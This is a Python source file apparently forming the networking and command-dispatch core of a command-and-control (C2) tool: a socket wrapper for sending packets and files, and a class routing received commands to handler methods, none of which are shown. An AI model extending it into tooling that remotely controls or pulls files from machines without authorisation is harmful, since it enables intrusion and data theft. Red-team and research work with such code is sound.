import inspect
import logging
from io import SEEK_END, BufferedIOBase, BytesIO
from socket import socket


class C2SocketError(Exception): pass


class RemoteDisconnected(C2SocketError): pass


class ReadError(C2SocketError): pass


class SendError(C2SocketError): pass


class C2Socket:
    RECV_BUFFER_SIZE = 128_000
    SEND_BUFFER_SIZE = 64_000

    def __init__(self, ip, port, sock: socket = None):
        self.ip = ip
        self.port = port
        self.remote = ip, port
        if not sock:
            self.sock = socket()
            self.sock.connect(self.remote)
            logging.debug(f"{self} : Connected to {self.sock.getpeername()}")
        else:
            self.sock = sock

    def __enter__(self):
        return self

    def __exit__(self, *args):
        logging.debug(f"{self} : __exit__ called")
        self.sock.close()

    def __repr__(self):
        return f"Socket<{self.remote}>"

    def read(self, n, writer_io=None):
        """ Read n bytes on socket, blocking method

        Args:
            n (int): length of bytes to read
            writer_io: function executed at each read which take data buffer

        Returns (bytes): Data read if no `buffer_callback` else number of bytes read

        """
        logging.debug(f"{self} : read({n}, {writer_io})")
        buffer_writer = writer_io or BytesIO()
        i = 0

        while i < n:
            buffer_len = min(C2Socket.RECV_BUFFER_SIZE, n - i)
            buffer = self.sock.recv(buffer_len)

            if len(buffer) == 0:
                raise RemoteDisconnected("Read 0 bytes. Disconnected")
            elif len(buffer) > buffer_len:
                raise ReadError(f"Read {len(buffer)} bytes, not {buffer_len} bytes. Disconnected")

            buffer_writer.write(buffer)
            i += len(buffer)

        logging.debug(f"{self} : read({n}), read={i}")

        if writer_io:
            return i
        else:
            buffer_writer.seek(0)
            return buffer_writer.read()

    def read_into_file(self, file):
        file_len = self.read_int()
        self.read(file_len, file)

    def read_int(self):
        """ Read next integer

        Returns (int): The next integer

        """
        data = self.read(4)
        return int.from_bytes(data, 'big')

    def read_packet(self):
        """"""
        logging.debug(f"{self} : read_packet")
        pkt_len = self.read_int()
        logging.debug(f"{self} : read_packet of len {pkt_len}")
        pkt_data = self.read(pkt_len)
        logging.debug(f"{self} : read_packet : {pkt_data[:100]}")
        return pkt_data

    def read_command(self):
        logging.debug(f"{self} : read_command")
        command = self.read_packet().decode()
        logging.debug(f"{self} : read_command : {command}")
        return command

    def send_int(self, integer):
        encoded = integer.to_bytes(4, 'big')
        self.sock.send(encoded)
        logging.debug(f"{self} : Send integer {integer} ({encoded})")

    def send_file(self, file):
        """ Send file

        Args:
            file (BufferedIOBase): File in binary read

        Returns (bool): True if no errors

        """
        length = file.seek(0, SEEK_END)
        try:
            self.send_int(length)
            file.seek(0)
            return length == self.sock.sendfile(file)
        except OSError as e:
            raise SendError(f"{self} : send_file raise exception %s : %s" % (type(e), e))

    def send_packet(self, data):
        logging.debug(f"{self} : send_packet, data of len {len(data)}")
        payload = len(data).to_bytes(4, 'big') + data
        try:
            if self.sock.sendall(payload) is not None:
                raise SendError()
            logging.debug(f"{self} : send_packet, total len {len(payload)}")
            return True
        except OSError as e:
            raise SendError("Error sending payload of length %s : %s : %s" % (len(data), type(e), e))


class Commands:
    def __init__(self, sock: C2Socket, cmd, params, raw_input):
        self.sock = sock
        self.cmd = cmd
        self.params = params
        self.function = self.get_function()
        _, *content = raw_input.split(maxsplit=1)
        self.input = content[0] if content else ''

    def is_valid(self):
        if not self.function:
            return

        fun_params = dict(inspect.signature(self.function).parameters)
        fun_params.pop('self', None)
        fun_params.pop('cls', None)
        positional = len([1 for p in fun_params.values() if p.kind == p.VAR_POSITIONAL])

        if len(self.params) > len(fun_params) and not positional:
            logging.debug(f"Too much parameters for function {self.function.__name__} : {self.params}")
        else:
            required_params = [fp for fp in fun_params.values() if fp.default == inspect._empty]
            missing = required_params[len(self.params):]
            if len(missing):
                logging.error(f"Missing parameters for function {self.function.__name__} :")
                logging.error(f"- Given parameters : {self.params}")
                logging.error(f"- Missing parameters : {', '.join(map(lambda p: p.name, missing))}")
            else:
                return True

    def get_function(self):
        fct_name = f"command_{self.cmd}"
        fct = getattr(self, fct_name, None)
        if fct is not None:
            return fct
        else:
            logging.warning(f"Missing method {fct_name} of class Commands.")

    def execute(self):
        if not self.function:
            return
        logging.debug(f"""Starting {self.function.__name__}("{'","'.join(self.params)}")""")
        try:
            self.function(*self.params)
        except (SendError, ReadError) as e:
            logging.error(f"Commands.{self.function.__name__} failed because : {type(e)} {e}")
